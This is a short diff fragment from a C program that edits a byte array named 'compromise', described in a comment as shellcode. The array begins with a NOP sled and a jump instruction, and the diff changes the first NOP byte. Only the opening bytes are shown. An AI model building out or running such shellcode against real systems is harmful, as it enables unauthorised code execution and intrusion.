@@ -20,7 +20,7 @@ int main(int argc, char * argv[]){
 
 // VAriable to contain hex bytes of shell code
 char compromise[159] = {
-0x90,0x90,0x90,0x90, // nops
+0x94,0x90,0x90,0x90, // nops
  // more nop
 // ; find out where we are
 0xEB, 0x4F, // start: jmp codeEnd
